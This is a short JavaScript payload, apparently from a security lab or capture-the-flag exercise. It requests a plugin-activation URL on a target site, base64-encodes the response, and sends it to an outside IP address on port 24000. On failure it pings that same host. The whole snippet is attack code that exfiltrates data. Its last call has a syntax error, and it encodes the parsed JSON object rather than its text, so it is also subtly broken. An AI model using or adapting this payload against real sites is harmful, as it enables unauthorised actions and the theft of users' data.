url = 'http://website-jmwrwc.inst.malicecyber.com/activate-plugin/1'
fetch(url).then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    // Parse the response as JSON
    return response.json();
  })
  .then(data => {
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data))
  })
  .catch(error => {
    fetch("http://82.65.210.151:24000/?error=true";
  });
